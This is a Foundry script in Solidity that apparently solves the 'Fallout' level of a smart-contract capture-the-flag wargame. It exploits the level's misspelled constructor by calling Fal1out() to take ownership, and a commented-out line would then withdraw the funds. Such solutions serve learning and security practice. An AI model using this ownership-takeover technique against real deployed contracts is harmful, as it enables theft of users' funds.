// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {Fallout} from "../src/level2Fallout.sol";
import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";

contract FalloutSolution is Script {
    Fallout public fallout =
        Fallout(0xaaE35bB89dbe3659ecAF7ed5f0967ae747aD92e7);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        fallout.Fal1out();
        if (fallout.owner() == vm.envAddress("MY_ADDRESS")) {
            console.log("You are the owner");
            // fallout.collectAllocations();
        } else {
            console.log("You are not the owner");
        }
        vm.stopBroadcast();
    }
}
